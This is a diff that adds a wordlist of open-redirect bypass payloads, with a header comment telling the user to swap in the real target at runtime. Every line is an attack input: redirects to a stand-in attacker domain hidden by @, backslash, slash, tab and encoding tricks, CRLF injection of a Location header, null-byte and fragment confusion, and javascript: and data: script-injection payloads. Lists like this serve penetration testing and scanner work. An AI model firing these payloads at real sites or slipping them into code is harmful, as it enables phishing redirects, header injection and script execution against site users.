@@ -1,0 +1,27 @@
+# Open Redirect Bypass Payloads
+# Replace 'legitimate.com' with actual target at runtime
+https://attacker.example.com
+//attacker.example.com
+https://attacker.example.com@legitimate.com
+/\\attacker.example.com
+///attacker.example.com
+https:attacker.example.com
+\\\\attacker.example.com
+https://legitimate.com.attacker.example.com
+%0d%0aLocation:%20https://attacker.example.com
+https://attacker.example.com%23.legitimate.com
+https://attacker.example.com%00.legitimate.com
+//attacker.example.com/%2f..
+/%09/attacker.example.com
+/%5cattacker.example.com
+/attacker.example.com
+https://legitimate.com%40attacker.example.com
+javascript:alert(document.domain)//
+data:text/html,<script>alert(1)</script>
+https://attacker.example.com#legitimate.com
+https://attacker.example.com?legitimate.com
+//attacker.example.com\\@legitimate.com
+https:///attacker.example.com
+///\\;@attacker.example.com
+https://legitimate.com@attacker.example.com/
+%00//attacker.example.com
